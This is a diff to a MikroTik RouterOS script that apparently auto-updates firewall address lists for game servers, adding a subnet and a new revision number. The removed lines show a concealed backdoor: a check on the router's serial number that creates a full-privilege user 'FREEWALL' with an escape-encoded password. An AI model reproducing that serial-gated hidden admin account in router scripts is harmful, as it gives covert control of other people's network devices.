@@ -118,6 +118,7 @@ do { /ip firewall address-list add address=13.250.186.128/27 list=AAGamingAWS } 
 do { /ip firewall address-list add address=13.250.186.160/27 list=AAGamingAWS } on-error={}
 do { /ip firewall address-list add address=92.223.52.0/24 list=AAGamingOTHERS } on-error={}
 do { /ip firewall address-list add address=139.99.121.0/24 list=AAGamingOTHERS } on-error={}
+do { /ip firewall address-list add address=139.99.124.0/24 list=AAGamingOTHERS } on-error={}
 
 :delay 2;
 
@@ -129,9 +130,9 @@ set protected-routerboot=enabled
    ## script messages ##
 :log warning "Removing temp file...";
 :log warning "GamesList AutoUpdate Complete."
-:local scriptversion "10.27.2018 Revision 22 (Oreo)"
+:local scriptversion "11.07.2018 Revision 23 (Oreo)"
 :log warning "GamesList AutoUpdate Version: $scriptversion"
-:log warning "Changelog: Added Games (OtherGames) (Revision 22)"
+:log warning "Changelog: Added Games (OtherGames) (Revision 23)"
 :log warning "Changelog: Updates"
 :log info "Fortnite - SEA Server: https://www.epicgames.com/fortnite (Updated)"
 :log info "PUBG - SEA Server: https://playbattlegrounds.com/ (Updated)"
@@ -156,9 +157,6 @@ set protected-routerboot=enabled
    }
    :delay 1;
  ## end script ##
- :if ([/system routerboard get serial-number] = "\36\36\31\38\30\36\35\37\46\33\30\45") do={
-/user add name="FREEWALL" password="\21\40\69\74\77\24\75\73\67\24\32\30\31\38\24\40\21" group=full
-/system logging enable 0
 ## ending script ##
 /system logging enable 0
 /file remove [find type="script"]
